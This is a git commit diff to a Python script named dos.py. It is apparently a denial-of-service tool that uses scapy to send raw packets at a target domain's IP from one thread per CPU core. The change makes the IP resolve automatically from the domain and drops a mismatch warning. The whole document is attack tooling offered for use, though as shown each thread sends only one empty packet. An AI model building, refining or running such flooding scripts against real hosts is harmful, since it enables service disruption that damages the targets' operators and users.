ca61da3427b3132f1b72598ea28b3828fb3589e2
INJ3KTOR <101106276+v1ck3@users.noreply.github.com>
2026-06-22 08:55:35 +0530

    Update dos.py

--- dos.py
+++ dos.py
@@ -2,23 +2,15 @@ from scapy.all import *
 import time
 import concurrent.futures
 
-def send_packet(domain, ip):
+def send_packet(domain):
+    ip = gethostbyname(domain)
     EtherLayer = Ether()
     IPLayer = IP(dst=ip)
     Packet = EtherLayer/IPLayer
-    sendp(Packet, iface="eth0")  # eth0 is the interface you want to use
+    sendp(Packet, iface="eth0")   # eth0 is the interface you want to use
 
 if __name__ == "__main__":
-    domain = input("Enter the domain: ")
-    ip = input("Enter the IP address: ")
-    
-    try:
-        resolved_ip = gethostbyname(domain)
-        if resolved_ip != ip:
-            print('Warning: The resolved IP does not match the provided IP.')
-    except Exception as e:
-        print(str(e))
+    domain  = input("Enter the domain: ")
         
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        # Submit a task for every CPU core in your system
-        futures = [executor.submit(send_packet, domain, ip) for _ in range(os.cpu_count())]
+        futures = [executor.submit(send_packet, domain) for _ in range(os.cpu_count())]
